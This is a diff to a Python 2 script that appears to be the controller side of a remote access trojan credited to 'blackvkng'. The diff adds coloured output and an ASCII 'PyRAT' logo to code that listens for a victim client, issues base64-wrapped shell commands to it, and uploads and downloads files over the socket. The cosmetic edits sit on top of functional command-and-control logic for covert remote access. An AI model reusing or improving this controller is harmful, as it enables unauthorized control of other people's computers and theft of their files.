@@ -14,9 +14,18 @@ import socket
 import os
 import sys
 import base64
+from colorama import init
+from colorama import Fore, Back, Style
 
 reload(sys)
 sys.setdefaultencoding("utf-8")
+
+green = Fore.GREEN
+yellow = Fore.YELLOW
+red = Fore.RED
+blue = Fore.CYAN
+white = Fore.WHITE
+bright = Style.BRIGHT
 
 host = "127.0.0.1"
 port = 8000
@@ -27,11 +36,29 @@ def crypt(TEXT, encode=True):
     else:
         return base64.b64decode(TEXT)
 
+def logo():
+    print bright +blue + """ 
+$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
+$$  __$$\           $$  __$$\ $$  __$$\\__$$  __|      
+$$ |  $$ |$$\   $$\ $$ |  $$ |$$ /  $$ |  $$ |         
+$$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$ |  $$ |         
+$$  ____/ $$ |  $$ |$$  __$$< $$  __$$ |  $$ |         
+$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |         
+$$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |         
+\__|       \____$$ |\__|  \__|\__|  \__|  \__|         
+          $$\   $$ |                                   
+          \$$$$$$  |      github.com/blackvkng                           
+           \______/                           
+"""
+	
+    help()
+    print bright + white + "="*80
+    
 def send(data):
     global pwd
     cli.sendall(crypt(data))
     pwd = crypt(cli.recv(1024), False)
-    print(crypt(cli.recv(16384), False))
+    print(bright + blue + crypt(cli.recv(16384), False))
 
 def upload(command):
     fileName = command.replace("upload ", "")
@@ -45,11 +72,11 @@ def upload(command):
             l = f.read(1024)
         f.close()
         cli.send(END_OF_FILE)
-        print crypt(cli.recv(1024), False)
+        print green + crypt(cli.recv(1024), False)+"\n"
         menu()
 
     except IOError:
-        print "File not found"
+        print Fore.RED + "[!] File not found\n"
 
 
 def download(command):
@@ -59,7 +86,7 @@ def download(command):
         l = cli.recv(1024)
 
         if l.startswith("File not found"):
-            print l 
+            print Fore.RED + "[!] File not found\n"
             menu()
         else:
 	        f = open(fileName, 'wb')
@@ -73,14 +100,14 @@ def download(command):
 	                f.write(l)
 	                l = cli.recv(1024)
 
-	        print "[+] Download complete!"
-	        print "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
+	        print bright + yellow + "[+] Download complete!"
+	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
 	        f.close()
 	        break
 	        menu()
 
 def help():
-    print"""
+    print Fore.YELLOW + """
 Commands:
     download                : Download files from client.
     upload                  : Upload files to client from server.
@@ -92,13 +119,13 @@ Execute programs on local machine:
     :dir ==> with ":"
     :cls
     :clear"""
-    menu()
 
 def main():
     global s, cli, addr, hostname, pwd
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
     s.listen(1)
+    print bright + Fore.YELLOW + "[-] Listening on ==> %s:%s\n"%(host, str(port))
     cli, addr = s.accept()
 
     pwd = crypt(cli.recv(1024), False)
@@ -106,7 +133,7 @@ def main():
 
 def menu():
     while True:
-        command = raw_input("[%s@%s]-[%s]~$ "%(hostname, addr[0], pwd))
+        command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
         if command == "help()":
             help()
             menu()
@@ -141,8 +168,10 @@ def start():
         try:
             main()
             menu()
-        except:
-			start()
+        except Exception as e:
+	    print e
 
 if __name__ == "__main__":
+    init(autoreset=True)
+    logo()
     start()
